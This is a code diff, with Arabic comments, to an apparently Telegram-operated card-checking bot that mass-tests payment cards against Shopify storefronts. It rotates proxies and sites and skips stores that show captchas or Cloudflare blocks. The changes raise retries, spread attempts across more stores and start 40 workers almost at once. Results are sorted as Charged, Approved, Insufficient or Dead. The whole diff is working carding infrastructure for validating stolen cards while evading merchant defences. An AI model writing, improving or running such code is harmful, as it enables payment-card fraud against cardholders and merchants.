@@ -628,8 +628,10 @@ async def remove_proxy_by_url(uid, proxy_url):
                     break
     except Exception: pass
 
-async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=3):
+async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid, max_retries=6):
     lr = None
+    tried_sites = set() # لضمان عدم تكرار فحص نفس البوابة للبطاقة الواحدة عند الفشل
+    
     for attempt in range(max_retries):
         if not proxies: 
             p = None
@@ -637,18 +639,23 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
             p_dict = random.choice(proxies)
             p = p_dict['proxy_url']
         
-        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS]
+        # تصفية المواقع النشطة والتي لم يتم تجربتها لهذه البطاقة في هذه المحاولة
+        acs = [s for s in sites if _SITE_ERRORS_COUNT.get(s, 0) < _MAX_SITE_ERRORS and s not in tried_sites]
         if not acs: 
-            _SITE_ERRORS_COUNT.clear()
+            # إذا تم تجربة كل المواقع، نتيح فرصة المحاولة مرة أخرى مع تجنب المواقع المجربة بالفعل في نفس الملف
+            acs = [s for s in sites if s not in tried_sites]
+        if not acs:
             acs = sites
             
         s = random.choice(acs) if acs else "touch-of-finland.myshopify.com"
+        tried_sites.add(s) # تسجيل الموقع الحالي لمنع التكرار
         
         if gateway_name == "Shopify":
             r = await check_shopify_api(SHOPIFY_API_URL_1, card, s, p, session)
             status = r.get('status')
             msg = str(r.get('message', '')).lower()
             
+            # في حال وجود مشكلة في البروكسي/الاتصال، يتم تدويره والمحاولة مجدداً
             if any(k in msg for k in ['proxy', 'tunnel', 'connection close', 'format error', 'max retries', 'bad gateway', 'timeout']):
                 if p_dict:
                     if p_dict in proxies:
@@ -657,11 +664,13 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
                 lr = r
                 continue
 
+            # تخطي أخطاء الـ Rate Limit مؤقتاً
             if status == 'Rate Limit' or any(k in msg for k in ['429', '504', '405', 'gateway']):
                 await asyncio.sleep(random.uniform(1.0, 1.8))
                 lr = r
                 continue
 
+            # في حال حدوث خطأ بوابة (Site Error) نقوم بتسجيله والانتقال لبوابة أخرى فوراً
             if status == 'Site Error' or is_dead_site_error(msg):
                 _SITE_ERRORS_COUNT[s] = _SITE_ERRORS_COUNT.get(s, 0) + 1
                 lr = r
@@ -669,10 +678,11 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, uid
         else:
             return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
         
-        if not r.get('retry'):
-            if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
-                _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
+        # إذا حصلنا على استجابة دفع حقيقية وحاسمة نخرج بها فوراً دون تكرار المحاولة
+        if status in ['Charged', 'Approved', 'Insufficient', 'Dead']: 
+            _SITE_ERRORS_COUNT[s] = max(0, _SITE_ERRORS_COUNT.get(s, 0) - 1)
             return r
+            
         lr = r
         
     if lr: return lr
@@ -1110,7 +1120,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 target_url = f"https://{site_url}/cart.json"
                 try:
                     async with session.get(target_url, proxy=p_url, timeout=6, ssl=False) as resp:
-                        # استبعاد بوابات الكابتشا أو החظر (403 = CF, 430 = Shopify Captcha, 429 = Rate Limit)
+                        # استبعاد بوابات الكابتشا أو الحظر (403 = CF, 430 = Shopify Captcha, 429 = Rate Limit)
                         if resp.status in [403, 429, 430, 502, 503, 504]:
                             captcha_count += 1
                             return
@@ -1293,7 +1303,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     sem = asyncio.Semaphore(WORKERS)
 
     async def worker(wid):
-        await asyncio.sleep(wid * 0.4)
+        # تم تقليل التأخير التدريجي لتبدأ الـ 40 workers جميعاً في أقل من ثانيتين!
+        await asyncio.sleep(wid * 0.05)
         nonlocal chk, chg, app, ins, dec, err, last_resp
         while not queue.empty() and not is_stopped():
             try: card = queue.get_nowait()
@@ -1301,7 +1312,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             async with sem:
                 try:
                     c_st = time.time()
-                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=3)
+                    # تم زيادة محاولات فحص بطاقة الـ Error وتجربتها على أكثر من بوابة مختلفة
+                    res = await check_card_with_retry(card, sites, proxies, http_session, gate_name, uid, max_retries=6)
                     if is_stopped(): break 
                     c_el = time.time() - c_st
                     status = res.get('status', 'Dead')
@@ -1320,7 +1332,8 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
                 except Exception: err += 1; chk += 1
                 finally:
                     queue.task_done()
-                    if not is_stopped(): await asyncio.sleep(random.uniform(8.0, 14.0))
+            # تم نقل وقت الانتظار لخارج كتلة الـ Semaphore لزيادة سرعة التزامن الكامل ومنع التعليق
+            if not is_stopped(): await asyncio.sleep(random.uniform(8.0, 14.0))
 
     wt = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
     process_store[uid]["tasks"] = wt + [ut]
